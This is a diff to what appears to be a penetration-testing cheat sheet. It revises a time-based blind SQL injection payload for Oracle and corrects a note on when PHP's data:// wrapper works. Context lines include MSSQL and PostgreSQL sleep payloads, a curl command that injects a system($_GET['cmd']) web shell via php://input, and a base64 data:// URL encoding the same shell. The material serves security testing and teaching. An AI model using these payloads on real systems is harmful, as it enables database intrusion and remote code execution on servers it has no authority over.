@@ -109,7 +109,7 @@ id=1; IF (1=1) WAITFOR DELAY '0:0:5'--
 id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
 
 # Oracle
-id=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)-- -
+id=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -
 ```
 A consistent ~5s delay on the true condition (vs. near-instant on false) confirms the injection. Confirm with `curl -w "%{time_total}\n"` or Burp's response-time column rather than eyeballing it.
 
@@ -243,7 +243,7 @@ http://target/index.php?page=php://filter/convert.base64-encode/resource=config
 ```bash
 curl "http://target/index.php?page=php://input" --data '<?php system($_GET["cmd"]); ?>'
 ```
-**Example — `data://` wrapper to execute inline base64 PHP (also needs `allow_url_include=On`, but works even with `allow_url_fopen=Off` since it's not a remote fetch):**
+**Example — `data://` wrapper to execute inline base64 PHP (needs both `allow_url_include=On` and `allow_url_fopen=On`):**
 ```
 http://target/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
 ```
